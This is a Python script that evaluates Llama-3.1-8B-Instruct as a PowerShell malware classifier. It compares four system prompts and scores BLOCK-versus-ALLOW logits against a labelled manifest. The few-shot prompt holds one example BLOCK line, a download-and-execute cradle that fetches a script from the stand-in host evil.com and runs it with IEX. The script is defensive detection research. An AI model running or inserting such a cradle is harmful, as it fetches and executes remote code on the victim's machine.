import torch
import pandas as pd
from transformers import AutoTokenizer, AutoModelForCausalLM

tok = AutoTokenizer.from_pretrained("meta-llama/Llama-3.1-8B-Instruct")
model = AutoModelForCausalLM.from_pretrained(
    "meta-llama/Llama-3.1-8B-Instruct", dtype=torch.float16, device_map="cuda"
)
ALLOW_ID = tok.encode(" ALLOW", add_special_tokens=False)[0]
BLOCK_ID = tok.encode(" BLOCK", add_special_tokens=False)[0]
print(f"ALLOW={ALLOW_ID} BLOCK={BLOCK_ID}")

manifest = pd.read_csv("artifacts/llama3/llama3_combo96_safe_pairs_manifest.csv")

SYSTEMS = {
    "raw_original": (
        "You are a security classifier. Label the given PowerShell as:\n"
        "ALLOW = benign / administrative / normal usage\n"
        "BLOCK = malicious (downloading, execution, evasion, credential theft, etc.)\n\n"
        "Return ONLY one word: ALLOW or BLOCK."
    ),
    "tight_definition": (
        "You are a security classifier. Label the given PowerShell as:\n"
        "ALLOW = benign / administrative / normal usage\n"
        "BLOCK = malicious (downloading, execution, evasion, credential theft, etc.)\n\n"
        "A script is BLOCK only if it combines multiple malicious indicators "
        "(e.g. downloads an unknown payload AND immediately executes it). "
        "A script using Base64 or web requests for a single legitimate purpose is ALLOW.\n\n"
        "Return ONLY one word: ALLOW or BLOCK."
    ),
    "adversarial_framing": (
        "You are a security classifier. Label the given PowerShell as:\n"
        "ALLOW = benign / administrative / normal usage\n"
        "BLOCK = malicious (downloading, execution, evasion, credential theft, etc.)\n\n"
        "Legitimate admin scripts routinely use Base64, web requests, compression, "
        "and credential APIs. Classify based on overall purpose, not individual constructs.\n\n"
        "Return ONLY one word: ALLOW or BLOCK."
    ),
    "few_shot": (
        "You are a security classifier. Label the given PowerShell as:\n"
        "ALLOW = benign / administrative / normal usage\n"
        "BLOCK = malicious (downloading, execution, evasion, credential theft, etc.)\n\n"
        "Return ONLY one word: ALLOW or BLOCK.\n\n"
        "Example ALLOW:\n"
        "Copy-Item $Path -Destination C:\\Backup\\ -Recurse\n"
        "Label: ALLOW\n\n"
        "Example BLOCK:\n"
        "$x=(New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1');IEX $x\n"
        "Label: BLOCK"
    ),
}


def run_eval(system):
    correct = benign_correct = mal_correct = 0
    benign_total = mal_total = 0
    for _, row in manifest.iterrows():
        msgs = [
            {"role": "system", "content": system},
            {"role": "user", "content": "PowerShell:\n```powershell\n" + row["content"] + "\n```\nAnswer:"},
        ]
        prompt = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True)
        inputs = tok(prompt, return_tensors="pt").to("cuda")
        with torch.no_grad():
            logits = model(**inputs).logits[0, -1]
        diff = float(logits[BLOCK_ID] - logits[ALLOW_ID])
        pred_label = "malicious" if diff > 0 else "benign"
        is_correct = pred_label == row["label"]
        correct += is_correct
        if row["label"] == "benign":
            benign_correct += is_correct
            benign_total += 1
        else:
            mal_correct += is_correct
            mal_total += 1
    return correct / len(manifest), benign_correct / benign_total, mal_correct / mal_total


for name, system in SYSTEMS.items():
    overall, benign_acc, mal_acc = run_eval(system)
    print(f"{name:25s}: overall={overall:.1%}  benign={benign_acc:.1%}  malicious={mal_acc:.1%}")
